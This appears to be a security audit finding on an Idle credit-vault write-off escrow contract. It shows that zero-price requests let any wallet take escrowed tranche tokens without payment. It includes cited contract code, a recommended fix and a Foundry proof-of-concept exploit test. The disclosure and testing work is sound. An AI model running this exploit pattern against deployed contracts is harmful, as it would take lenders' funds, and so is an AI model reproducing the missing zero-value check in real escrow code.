### Title
Zero-price write-off requests let any fulfiller seize escrowed tranches - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates only that the deposited tranche amount is nonzero, while accepting `underlyingsRequested == 0`. [1](#0-0)  `fullfillWriteOffRequest` is callable by any wallet and treats `_underlyings >= currentRequest.underlyings` as valid, so a zero-price request can be fulfilled with zero payment. [2](#0-1) 

### Finding Description
During a running epoch, a lender escrow tranche tokens by calling `createWriteOffRequest(amount, 0)`, which stores the zero ask and adds zero to `pendingUnderlyings`. [3](#0-2)  An unprivileged fulfiller can then call `fullfillWriteOffRequest(victim, amount, 0)`, causing the escrow to delete the request and transfer the escrowed tranche tokens to the attacker. [4](#0-3)  Because the requested and transferred underlying amounts are both zero, the lender receives nothing and no exit fee is paid. [5](#0-4) 

### Impact Explanation
This breaks the escrow's intended atomic exchange invariant: escrowed tranche tokens should only leave in return for the requested underlying consideration. [6](#0-5)  A request for 10,000 AA tranche tokens can therefore be taken for 0 USDC, permanently transferring the lender's claim represented by those tranche tokens to the fulfiller. [7](#0-6) 

### Likelihood Explanation
The attack requires a lender to create a malformed zero-price request, but any unprivileged wallet may monitor pending requests and fulfill it immediately. [8](#0-7)  No borrower, owner, manager, KYC, epoch-transition, or privileged-role action is needed after request creation. [9](#0-8) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, and defensively reject zero-payment fulfillment in `fullfillWriteOffRequest` for legacy zero-ask requests. [10](#0-9)  If overpayment must remain supported, preserve `_underlyings >= currentRequest.underlyings` but additionally require `_underlyings != 0` and `currentRequest.underlyings != 0`. [11](#0-10) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; it uses the existing mainnet-fork setup and LP approval. [12](#0-11) 

```solidity
function testPocZeroAskWriteOffRequestCanBeSeized() external {
  uint256 trancheAmount = 10_000e18;
  address attacker = makeAddr("attacker");

  // A running-epoch lender accidentally creates a request asking for zero USDC.
  vm.prank(LP);
  escrow.createWriteOffRequest(trancheAmount, 0);

  (uint256 storedTranches, uint256 storedUnderlyings) = escrow.userRequests(LP);
  assertEq(storedTranches, trancheAmount);
  assertEq(storedUnderlyings, 0);

  uint256 attackerTranchesBefore = tranche.balanceOf(attacker);
  uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);
  uint256 lpUnderlyingBefore = underlying.balanceOf(LP);

  // No approval or payment is required because the transferred amount is zero.
  vm.prank(attacker);
  escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

  assertEq(tranche.balanceOf(attacker) - attackerTranchesBefore, trancheAmount);
  assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);
  assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);

  (storedTranches, storedUnderlyings) = escrow.userRequests(LP);
  assertEq(storedTranches, 0);
  assertEq(storedUnderlyings, 0);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L17-21)
```text
/// @title IdleCreditVaultWriteOffEscrow
/// @dev Contract that collects write off requests of a credit vault deposit from a lender and underlyings from a fulfiller
/// and allow them to trustlessly exchange debt between lender and buyer. If the borrower fulfills the request, the borrower
/// will then be able to write off the debt by burning tranche tokens (via IdleCDOEpochVariant writeOffDeposit method)
contract IdleCreditVaultWriteOffEscrow is Initializable, OwnableUpgradeable, ReentrancyGuardUpgradeable {
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L122-151)
```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-63)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
  }
```
